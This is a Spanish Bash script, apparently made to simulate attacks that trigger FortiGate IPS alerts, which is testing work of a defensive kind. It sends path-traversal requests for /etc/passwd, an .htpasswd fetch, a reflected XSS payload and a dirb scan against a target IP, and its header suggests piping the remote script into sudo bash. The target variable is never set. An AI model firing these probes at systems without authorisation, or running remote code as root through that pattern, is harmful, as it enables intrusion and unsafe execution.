#!/bin/bash

# Pongo a disposición pública este script bajo el término de "software de dominio público".
# Puedes hacer lo que quieras con él porque es libre de verdad; no libre con condiciones como las licencias GNU y otras patrañas similares.
# Si se te llena la boca hablando de libertad entonces hazlo realmente libre.
# No tienes que aceptar ningún tipo de términos de uso o licencia para utilizarlo o modificarlo porque va sin CopyLeft.

# ----------
# Script de NiPeGun para instalar realizar ataques IPS a un FortiGate
#
# Ejecución remota con sudo:
#   curl -sL https://raw.githubusercontent.com/nipegun/dh-scripts/refs/heads/main/Simular-Ataque-IPS-Fortigate.sh | sudo bash
#
# Bajar y editar directamente el archivo en nano
#   curl -sL https://raw.githubusercontent.com/nipegun/dh-scripts/refs/heads/main/Simular-Ataque-IPS-Fortigate.sh | nano -
# ----------

# Definir constantes de color
  cColorAzul="\033[0;34m"
  cColorAzulClaro="\033[1;34m"
  cColorVerde='\033[1;32m'
  cColorRojo='\033[1;31m'
  # Para el color rojo también:
    #echo "$(tput setaf 1)Mensaje en color rojo. $(tput sgr 0)"
  cFinColor='\033[0m'

# Comprobar si el script está corriendo como root
  #if [ $(id -u) -ne 0 ]; then     # Sólo comprueba si es root
  if [[ $EUID -ne 0 ]]; then       # Comprueba si es root o sudo
    echo ""
    echo -e "${cColorRojo}  Este script está preparado para ejecutarse con privilegios de administrador (como root o con sudo).${cFinColor}"
    echo ""
    exit
  fi

# Comprobar si el paquete curl está instalado. Si no lo está, instalarlo.
  if [[ $(dpkg-query -s curl 2>/dev/null | grep installed) == "" ]]; then
    echo ""
    echo -e "${cColorRojo}  El paquete curl no está instalado. Iniciando su instalación...${cFinColor}"
    echo ""
    apt-get -y update
    apt-get -y install curl
    echo ""
  fi

# Alerta: Web.Server.Password.File.Access
  curl -X GET "http://"$vIP":80/../../etc/passwd"

# Alerta: HTPasswd.Access
  curl -X GET "http://"$vIP":80/.htpasswd"

# Alerta: Cross.Site.Scripting
  curl -X GET "http://"$vIP":80/search?query=<script>alert('XSS')</script>"

# Alerta: Generic.Path.Traversal.Detection
  curl -X GET "http://"$vIP":80/index.php?page=../../../../etc/passwd"




# Alerta: Comtrend.Devices.Information.Disclosure
  dirb http://"$vIP":80 -X .html,.js,.txt,.log
